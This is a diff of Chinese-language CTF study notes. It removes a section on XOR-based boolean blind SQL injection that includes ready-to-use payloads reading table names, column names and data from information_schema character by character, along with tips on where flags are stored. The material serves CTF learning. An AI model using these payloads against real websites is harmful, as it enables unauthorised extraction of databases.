@@ -15,21 +15,3 @@ F12查看网络请求情况。
 ^
 一般flag在/flag或/flag.txt中，也可能在env命令环境变量中，还可能在phpinfo()中。
 
-^
-## **sql注入考点**
-部分sql盲注入如逻辑布尔盲注，需要使用代码一个一个字符跑出来。
-
-异或盲注?id=1^1^1
-在这个前提下，分析回显内容的字符差异，进行布尔盲注，代码中使用二分法加快布尔盲注。
-```
-获取表名
-1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)^1
-[*] F1naI1y,Flaaaaag~
-猜测列名
-1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))>0)^1
-猜测值
-1^(ord(substr((select(group_concat(列名))from(表名)),1,1))>0)^1
-```
-
-案例：
-<https://www.cnblogs.com/upfine/p/16367693.html#:~:text=%E5%88%86%E4%BA%AB%E4%B8%8B%E8%87%AA%E5%B7%B1%E5%9C%A8%E5%AE%8C%E6%88%90%20[>
